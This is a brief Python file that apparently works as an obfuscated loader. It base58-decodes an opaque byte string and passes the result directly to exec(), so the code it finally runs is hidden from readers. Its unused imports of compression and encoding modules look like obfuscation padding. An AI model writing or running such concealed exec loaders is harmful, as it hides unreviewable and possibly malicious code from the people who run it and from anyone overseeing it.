import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'3EXURNb5Lpfq27zPePPACZM3oJaN2hc7BLHADRAAH3jTEfmcmgjnMX8jwsqDk1vGK54gkV9qH31PzYxfth36aBGFZvHxbJ7M8jkG8vw95jqkHk9g81kfFd3tPe1Y4Qxr4n5siYZLwpqVcYmwh39A8XEDCASYnTB'
_A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
_n = 0
for _c in _p.decode():
    _n = _n * len(_A) + _A.index(_c)
exec(_n.to_bytes((_n.bit_length() + 7) // 8, 'big').decode())
